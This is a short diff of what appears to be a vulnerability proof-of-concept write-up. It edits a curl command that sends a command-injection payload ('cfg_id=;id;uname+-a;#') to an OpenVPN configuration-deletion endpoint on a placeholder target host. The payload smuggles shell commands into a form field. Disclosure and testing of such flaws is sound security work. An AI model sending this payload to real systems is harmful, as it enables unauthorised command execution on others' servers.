@@ -38,5 +38,5 @@ check
 ```
 ### Curl PoC
 ```
-curl -X POST -d 'cfg_id=;id;#' http://TARGET/ajax/openvpn/del_ovpncfg.php
+curl -X POST -d 'cfg_id=;id;uname+-a;#' http://TARGET/ajax/openvpn/del_ovpncfg.php
 ```
